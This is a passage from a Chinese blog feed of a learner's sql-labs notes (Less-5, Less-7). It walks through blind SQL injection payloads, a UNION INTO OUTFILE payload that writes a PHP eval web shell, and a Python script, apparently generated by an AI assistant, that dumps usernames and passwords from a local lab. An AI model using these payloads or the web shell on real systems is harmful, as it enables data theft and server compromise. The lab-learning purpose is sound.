class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据库名/表名/字段名/数据: %s&#x27;</span> % name)<br>            <span class="hljs-keyword">break</span><br> <br>        <span class="hljs-comment"># 如果某个字符不存在,则停止程序</span><br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> count &gt;= (<span class="hljs-number">128</span> - <span class="hljs-number">31</span>):<br>            exit()<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/120115458">https://blog.csdn.net/wangyuxiang946/article/details/120115458</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-04</title>
    <link href="/2025/03/02/note-04/"/>
    <url>/2025/03/02/note-04/</url>
    
    <content type="html"><![CDATA[<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>需要先设置mysql的文件读写权限：  </p><blockquote><p>Windows的配置文件在mysql下的my.ini<br>Linux的配置文件在&#x2F;etc&#x2F;conf  </p></blockquote><p>怎么找也找不到，最后问了卡密，在&#x2F;etc&#x2F;mysql中找到了；<br>但是还是没法写马；<br>docker环境现在还没搞懂，以后有机会再在其它环境下再部署sql-labs试试；</p><h2 id="看网上的解法写点笔记："><a href="#看网上的解法写点笔记：" class="headerlink" title="看网上的解法写点笔记："></a>看网上的解法写点笔记：</h2><p>先判断注入类型，没有sql错误回显的情况就不断猜测闭合语句，能正确闭合不报错就表示闭合成功  </p><p>因为用 ‘ 打破’’闭合但是没用猜对全部闭合的话会一直提示sql语法错误，能完成闭合并且并且不报错就为完全猜对。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>然后用联合查询<br>select搭配into outfile能写入数据<br>大概是select能查询数据，into outfile能写入数据<br>union select 1,user(),database() into outfile “路径”<br>能写入：<br>1，当前用户，数据库名称</p><blockquote><p>url 中反斜杠\会被当作转义字符处理所以要用两个反斜杠来传入</p></blockquote><p>写马</p><blockquote><p>?id&#x3D;1’)) union select 1,2,’<?php @eval($_POST["mima"])?>‘ into outfile “C:\phpStudy\WWW\sqli\Less-7\test.php” – #  </p></blockquote><p>这里的路径不是我的环境<br>现在才知道原来$_GET和POST必须大写…..<br>最后连马就行</p><h2 id="另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果"><a href="#另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果" class="headerlink" title="另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果"></a>另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果</h2><blockquote><p>在sql中能用‘@@datadir’ 返回数据库的绝对路径，随后猜测网站的绝对路径  </p></blockquote><p>将查询到的当前用户和数据库名称写入到题目目录下的1.txt随后访问就能看到查询结果</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">database</span>(), <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\1.txt&quot;</span> --+<br></code></pre></td></tr></table></figure><p>然后就是标准操作</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\2.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>我想，因为不用担心回显界面问题所以也可以不用group_concat,union等，前面两个的查询也是一样</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\3.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=&#x27;users&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\4.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>其实我看没有了回显页面的限制，不用爆字段也行，直接爆表就得：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\5.txt&quot;</span> <span class="hljs-comment">--+ </span><br></code></pre></td></tr></table></figure><blockquote><p>这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传1.txt，下次再上传1.txt，就是无效命令了，也就是新的1.txt中的内容并不会覆盖之前的1.txt</p></blockquote><p><a href="https://blog.csdn.net/m0_46315342/article/details/106557552">https://blog.csdn.net/m0_46315342/article/details/106557552</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-03</title>
    <link href="/2025/02/28/note-03/"/>
    <url>/2025/02/28/note-03/</url>
    
    <content type="html"><![CDATA[<style>pre {  overflow-y: auto;  max-height: 300px;}</style><h1 id="sql-labs-less5"><a href="#sql-labs-less5" class="headerlink" title="sql-labs less5"></a>sql-labs less5</h1><p>输入payload  </p><blockquote><p>?id&#x3D;1<br>?id&#x3D;2</p></blockquote><p>回显</p><blockquote><p>You are in………..  </p></blockquote><blockquote><p>You are in………..  </p></blockquote><p>视乎是没有回显。根据以前一点点ctf的经验，应该是布尔盲注了，没想到第五题就遇上了。  </p><p>尝试构建sql注入的paylaod  </p><blockquote><p>?id&#x3D;1’  </p></blockquote><p>回显</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1    </p></blockquote><p>推测后端语句可能为  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure><p>然后看csdn</p><p>看到两种解法，经典的是基于时间的布尔盲注，新的是基于xml报错回显的注入</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>原理是用sql中的  </p><blockquote><p>and if  </p></blockquote><p>返回的布尔值（true,false）然后用if()设置不同的反应，根据反应来判断布尔的值来判断注入查询的数据是否存在吧</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">length</span>函数用法<br>后端语句：<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>()； -- 返回<span class="hljs-keyword">length</span>里的字节或字符长度<br></code></pre></td></tr></table></figure><p>length函数：</p><p>KIMI：  </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arcade">MySQL：<span class="hljs-built_in">LENGTH</span> 返回字节长度，CHAR_LENGTH 返回字符长度。<br>PostgreSQL：<span class="hljs-built_in">LENGTH</span> 返回字符长度。<br>SQLite：<span class="hljs-built_in">LENGTH</span> 返回字节长度。<br>SQL Server：LEN 返回字符长度。<br>Oracle：<span class="hljs-built_in">LENGTH</span> 返回字节长度，LENGTHC 返回字符长度。<br><br>PostgreSQL/SQLite/Oracle：使用 <span class="hljs-keyword">CASE</span> 语句。<br><br>SQL Server：使用 <span class="hljs-keyword">CASE</span> 语句或 <span class="hljs-keyword">IF</span>...<span class="hljs-keyword">ELSE</span> 语句。<br><br></code></pre></td></tr></table></figure><p>sql中if()语句的用法：  </p><p>KIMI：  </p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lasso">MySQL：<span class="hljs-keyword">IF</span>(expr, true_expr, false_expr)<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;False&#x27;</span>); -- 返回 <span class="hljs-string">&#x27;True&#x27;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-number">1</span> &lt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;False&#x27;</span>); -- 返回 <span class="hljs-string">&#x27;False&#x27;</span><br><br>PostgreSQL/SQLite/Oracle：使用 <span class="hljs-keyword">CASE</span> 语句。<br><br>SQL Server：使用 <span class="hljs-keyword">CASE</span> 语句或 <span class="hljs-keyword">IF</span><span class="hljs-params">...</span><span class="hljs-keyword">ELSE</span> 语句。  <br><br></code></pre></td></tr></table></figure><p>看csdn上，可以用length根据是否有You are in………..来判断；  </p><p>也能用and if sleep的时间延迟来判断；</p><p>根据前几题大概知道数据库名称为’security’为8个字符；  </p><p>payload：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(database())=<span class="hljs-number">8</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+  </span><br></code></pre></td></tr></table></figure><p>payload的逻辑是先用length判断当前所在数据库的名字长度，</p><blockquote><p>如果猜对为8，则让回显延迟5秒，此时因为使用了and，and的右边无法满足布尔值为真，所以不会有回显<br>什么也没有回显，说明猜测字符长度正确；</p></blockquote><blockquote><p>如果猜测错误，则会使得if返回1，让and的两边满足全为真，使得服务器返回‘you are in……’</p></blockquote><p>其中用到了if函数和sleep函数,<br>sleep()函数是让回显延迟指定的时间吧；  </p><p>回到payload</p><p>按照我们设置的延迟可确认确实为8个字符，也就是’security’</p><p>试了一下</p><p>id&#x3D;1’ and if(length(database())&#x3D;’security’,sleep(5),1)–+id&#x3D;1’ and if(length(database())&#x3D;’security’,sleep(5),1)–+</p><p>问了kimi，原来是length()函数只会返回整型数值，而我要用它来对比字符串😅  </p><p><strong>然后是substr()函数</strong>  </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">SUBSTR(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br><br><span class="hljs-keyword">string</span>：原始字符串。<br><span class="hljs-built_in">start</span>：子字符串的起始位置（从 <span class="hljs-number">1</span> 开始计数）。<br><span class="hljs-built_in">length</span>：要提取的子字符串的长度。<br></code></pre></td></tr></table></figure><p>ascii()</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ASCII(character_expression)<br><br>character_expression：可以是单个字符、字符串字面值或列名。该参数必须是字符类型（如 <span class="hljs-type">CHAR</span> 或 <span class="hljs-type">VARCHAR</span>）。<br></code></pre></td></tr></table></figure><p>一定要转成ascii吗？<br>试了一下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;,sleep(5),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;security&#x27;</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>确实能直接猜测字符了!</p><p>如果有python脚本的话……<br>k：有的兄弟，有的</p><p>KIMI：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>//配置<br>TARGET_URL = <span class="hljs-string">&quot;http://localhost:32768/Less-5/&quot;</span>  // 目标URL<br>TRUE_STRING = <span class="hljs-string">&quot;You are in...........&quot;</span>  // 数据库判断成功的响应标志<br>CHARSET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span>  // 测试字符集<br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;</span><br>&#125;<br><br>//发送请求<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>?id=1&#x27; AND <span class="hljs-subst">&#123;payload&#125;</span> --+&quot;</span><br>    response = requests.get(url, headers=HEADERS)<br>    <span class="hljs-keyword">return</span> response.text<br>// 获取长度<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">query</span>):<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;LENGTH(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;length&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 长度为: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> length<br>        length += <span class="hljs-number">1</span><br>// 逐字符获取字符串<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">query, length</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取第 <span class="hljs-subst">&#123;i&#125;</span> 个字符...&quot;</span>)<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            payload = <span class="hljs-string">f&quot;SUBSTR(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span><br>            response = send_payload(payload)<br>            <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                result += char<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 当前结果: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br>// 主函数<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    // 获取数据库名<br>    db_length = get_length(<span class="hljs-string">&quot;DATABASE()&quot;</span>)<br>    db_name = get_string(<span class="hljs-string">&quot;DATABASE()&quot;</span>, db_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据库名: <span class="hljs-subst">&#123;db_name&#125;</span>&quot;</span>)<br><br>    // 获取表名<br>    table_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=<span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        table_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表数量: <span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span>)<br><br>    // 获取所有表名<br>    table_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(table_count):<br>        tbl_length = get_length(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        tbl_name = get_string(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, tbl_length)<br>        table_names.append(tbl_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表名: <span class="hljs-subst">&#123;tbl_name&#125;</span>&quot;</span>)<br><br>    // 获取字段名（以users表为例）<br>    target_table = <span class="hljs-string">&quot;users&quot;</span>  // 替换为目标表名<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的字段...&quot;</span>)<br>    field_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE())=<span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        field_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段数量: <span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span>)<br><br>    // 获取字段名<br>    field_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        fld_length = get_length(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        fld_name = get_string(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, fld_length)<br>        field_names.append(fld_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段名: <span class="hljs-subst">&#123;fld_name&#125;</span>&quot;</span>)<br><br>    // 获取数据<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的数据...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        <span class="hljs-keyword">if</span> field_names[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>]:  // 获取用户名和密码字段<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取字段: <span class="hljs-subst">&#123;field_names[i]&#125;</span>&quot;</span>)<br>            data_count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM <span class="hljs-subst">&#123;target_table&#125;</span>)=<span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span><br>                response = send_payload(payload)<br>                <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                    <span class="hljs-keyword">break</span><br>                data_count += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据条数: <span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_count):<br>                data_length = get_length(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>)<br>                data = get_string(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>, data_length)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据[<span class="hljs-subst">&#123;j+<span class="hljs-number">1</span>&#125;</span>]: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>这是直接猜测字符而不猜测其ascii码的<br>改了一下  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">sr</span> <span class="hljs-operator">=</span> string.printable<br><span class="hljs-attribute">CHARSET</span> <span class="hljs-operator">=</span> sr  //<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span>  // 测试字符集<br></code></pre></td></tr></table></figure><p>因为我也不敢确定ai给出的字符是完整且编码正确的  </p><p>恕我只是个脚本小子，能学懂原理先吧  </p><p>运行结果</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span 